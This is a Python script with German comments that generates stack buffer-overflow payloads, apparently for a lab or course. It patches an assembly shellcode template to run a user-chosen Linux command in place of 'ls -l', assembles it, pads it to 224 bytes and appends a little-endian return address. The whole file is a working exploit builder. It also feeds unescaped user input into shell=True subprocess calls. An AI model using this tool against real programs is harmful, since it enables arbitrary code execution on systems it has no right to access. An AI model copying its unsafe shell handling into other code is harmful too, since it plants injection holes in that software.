#! /usr/bin/python3
import sys  # sys Modul importieren (für generelle Funktionen)
import codecs  # codecs Modul importieren (für unicode)
import os  # os Modul importieren (um Dateien zu öffnen)
import subprocess  # subprocess Modul importieren für subprocess.call() (Linux Pprgramme ausführen)

if len(sys.argv) == 4:  # Sofern 3 Argumente übergeben wurden
    try:  # Versuche
        address = codecs.decode(sys.argv[1], "hex")  # Hexadezimal zu Dezimal umwandeln
        address = address[::-1]  # Umkehren/Little Endian
    except:  # Sofern Fehler
        print("Bitte Adresse in Hexadezimal angeben!")  # Ausgabe
        sys.exit(0)  # Programm beenden

    if isinstance(sys.argv[3], str):  # Sofern Argument 2 ein String ist
        pathParameter = sys.argv[3]  # Argument 2 in "pathParameter" speichern
        pathParameterLength = len(pathParameter)  # Länge von "pathParameter" in "pathParameterLength" speichern
    else:  # Andernfalls
        print("Bitte Linux Befehl als String angeben!")  # Ausgabe
        sys.exit(0)  # Programm beenden

    if os.path.isfile(sys.argv[2]):  # Sofern Datei existiert
        path = sys.argv[2]  # Dateipfad speichern
        subprocess.run("cp {} script_modified.asm".format(path),
                       shell=True)  # Mit Kindprozess cp {} script_modified.asm Inhalt der in "path" gespeicherten Datei in neue Datei kopieren
        if sys.argv[3].endswith("A"):  # Sofern String in Argument 3 mit einem "A" endet
            subprocess.run(
                "sed -i 's/0x41/0x42/' script_modified.asm",
                shell=True)  # Mit Kindprozess sed -i 's/0x41/0x42/' script_modified.asm alle Vorkommen von "0x41" durch "0x42" ersetzen
            subprocess.run(
                "sed -i 's/A/B/' script_modified.asm",
                shell=True)  # Mit Kindprozess sed -i 's/A/B/' script_modified.asm alle Vorkommen von "A" durch "B" ersetzen
        subprocess.run(
            "sed -i 's/rdx+5/rdx+{}/' script_modified.asm"
                .format(pathParameterLength), shell=True)  # Mit Kindprozess sed -i 's/rdx+5/rdx+{}/' script_modified.asm alle Vorkommen von "rdx+5" durch "rdx+{}" ersetzen (Neue Länge des Shellcodes)
        subprocess.run(
            "sed -i 's#ls -l#{}#' script_modified.asm"
                .format(pathParameter), shell=True)  # Mit Kindprozess sed -i 's#ls -l#{}#' script_modified.asm alle Vorkommen von "ls -l" durch "{}" ersetzen (übergebener String mit Linux Programm)
        subprocess.run(" nasm -f bin script_modified.asm -o a.bin",
                       shell=True)  # Ausführen von nasm -f bin {} -o a.bin als Kindprozess (asm-Datei in Binärdatei umwandeln)
        subprocess.run("./dumpshellcode.py a.bin > a.txt",
                       shell=True)  # Ausführen von dumpshellcode.py a.bin > a.txt als Kindprozess (Binärdatei in nutzbaren Shellcode umwandeln und in "a.txt" schreiben)
    else:  # Andernfalls
        print("Datei existiert nicht!")  # Ausgabe
        sys.exit(0)  # Programm beenden

    f=open("a.txt","r+")  # Datei a.txt öffnen, welche vorher erstellt wurde
    shellcode= f.read()  # Datei a.txt in Zeichenkette "shellcode" schreiben
    shellcode=bytes(shellcode, 'utf-8')  # Zeichenkette in Bytes umwandeln
    shellcode=shellcode.decode('unicode_escape').encode\
    ("raw_unicode_escape")  # Doppelte Backslashs entfernen
    f.close()  # Datei a.txt schließen

    os.system("rm a.txt")  # Datei a.txt löschen
    os.system("rm a.bin")  # Datei a.bin löschen

    padding_size= 224 - (len(shellcode))-\
    (int((len(sys.argv[1])/2))+2)  # Paddinggröße berechnen
    os.write(1,shellcode + b"A" * padding_size + address)  # Shellcode schreiben
else:  # Anderfalls
    print("Wie folgt zu Benutzen:", "Programmname:", sys.argv[0],
          "Bufferadresse", "Pfad zum Assemblerprogramm",
          "'Linux Programm'")  # Ausgabe mit Hinweis auf korrekte Angabe der Parameter
    sys.exit(0)  # Programm beenden